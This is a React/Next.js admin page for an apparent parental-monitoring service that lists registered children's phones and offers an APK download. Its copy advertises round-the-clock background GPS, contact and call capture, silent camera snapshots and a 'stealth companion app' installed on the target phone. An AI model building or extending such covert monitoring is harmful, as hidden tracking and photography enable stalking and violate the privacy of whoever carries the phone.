// app/admin/devices/page.tsx
"use client";

import React, { useEffect, useState, useCallback } from "react";
import { MonitoredDevice } from "@/lib/device-types";
import { DeviceOverviewCard } from "@/components/admin/devices/DeviceOverviewCard";
import { AddDeviceModal } from "@/components/admin/devices/AddDeviceModal";
import { ApkDownloadModal } from "@/components/admin/devices/ApkDownloadModal";
import { Button } from "@/components/ui/Button";
import { Smartphone, Plus, RefreshCw, Shield, Download, Radio } from "lucide-react";

export default function AdminDevicesPage() {
  const [devices, setDevices] = useState<MonitoredDevice[]>([]);
  const [loading, setLoading] = useState(true);
  const [modalOpen, setModalOpen] = useState(false);
  const [apkModalOpen, setApkModalOpen] = useState(false);

  const fetchDevices = useCallback(async () => {
    try {
      const res = await fetch("/api/devices");
      const data = await res.json();
      if (res.ok && data.devices) {
        setDevices(data.devices);
      }
    } catch (err) {
      console.error("Failed to load devices", err);
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchDevices();
    const interval = setInterval(fetchDevices, 12000);
    return () => clearInterval(interval);
  }, [fetchDevices]);

  const onlineCount = devices.filter((d) => d.is_online).length;
  const lowBatteryCount = devices.filter((d) => d.battery_level <= 20).length;

  return (
    <div className="space-y-6 pb-20 md:pb-8">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2">
            <h1 className="text-2xl font-black text-white tracking-tight flex items-center gap-2">
              <Smartphone className="w-6 h-6 text-[#FFFC00]" />
              Kid&apos;s Devices
            </h1>
            <span className="flex items-center gap-1 px-2.5 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-[11px] font-bold">
              <Radio className="w-3 h-3 animate-pulse" /> Live
            </span>
          </div>
          <p className="text-white/50 text-xs mt-1">
            Realtime multi-device monitoring hub for your children. 24/7 background GPS, contacts, calls, and silent camera snapshots.
          </p>
        </div>

        <div className="flex items-center gap-2">
          <Button
            variant="glass"
            size="sm"
            onClick={fetchDevices}
            disabled={loading}
            className="border-white/10 text-white/70 hover:text-white"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${loading ? "animate-spin" : ""}`} />
          </Button>

          <Button
            variant="secondary"
            size="sm"
            onClick={() => setApkModalOpen(true)}
            className="border-white/10 text-white hover:border-[#FFFC00]/50"
          >
            <Download className="w-3.5 h-3.5 mr-1.5 text-[#FFFC00]" />
            Get APK
          </Button>

          <Button
            size="sm"
            onClick={() => setModalOpen(true)}
            className="shadow-lg shadow-yellow-500/20"
          >
            <Plus className="w-4 h-4 mr-1.5 stroke-[2.5]" />
            Register Device
          </Button>
        </div>
      </div>

      {/* Metrics Row */}
      <div className="grid grid-cols-3 gap-3">
        <div className="p-4 rounded-2xl bg-white/[0.03] border border-white/10 flex flex-col justify-between">
          <span className="text-xs text-white/50 font-medium">Total Kids</span>
          <span className="text-2xl font-black text-white mt-2">{devices.length}</span>
        </div>
        <div className="p-4 rounded-2xl bg-white/[0.03] border border-white/10 flex flex-col justify-between">
          <span className="text-xs text-white/50 font-medium">Online Devices</span>
          <span className="text-2xl font-black text-emerald-400 mt-2">{onlineCount}</span>
        </div>
        <div className="p-4 rounded-2xl bg-white/[0.03] border border-white/10 flex flex-col justify-between">
          <span className="text-xs text-white/50 font-medium">Low Battery (&le;20%)</span>
          <span className={`text-2xl font-black mt-2 ${lowBatteryCount > 0 ? "text-red-400" : "text-white/60"}`}>
            {lowBatteryCount}
          </span>
        </div>
      </div>

      {/* Devices Grid */}
      {devices.length === 0 && !loading ? (
        <div className="p-12 rounded-3xl bg-white/[0.02] border border-white/10 text-center max-w-md mx-auto my-8">
          <div className="w-16 h-16 rounded-full bg-[#FFFC00]/10 border border-[#FFFC00]/30 text-[#FFFC00] flex items-center justify-center mx-auto mb-4">
            <Shield className="w-8 h-8" />
          </div>
          <h3 className="text-lg font-bold text-white mb-1">No Devices Connected Yet</h3>
          <p className="text-white/50 text-xs mb-6 leading-relaxed">
            Register your first child&apos;s device to get a pairing code, then install the stealth companion app on their phone.
          </p>
          <Button onClick={() => setModalOpen(true)} className="w-full">
            <Plus className="w-4 h-4 mr-1.5" />
            Register First Device
          </Button>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {devices.map((device) => (
            <DeviceOverviewCard
              key={device.id}
              device={device}
              onRefresh={fetchDevices}
            />
          ))}
        </div>
      )}

      {/* Add Device Modal */}
      <AddDeviceModal
        isOpen={modalOpen}
        onClose={() => setModalOpen(false)}
        onSuccess={fetchDevices}
      />

      {/* APK Download & Instructions Modal */}
      <ApkDownloadModal
        isOpen={apkModalOpen}
        onClose={() => setApkModalOpen(false)}
      />
    </div>
  );
}
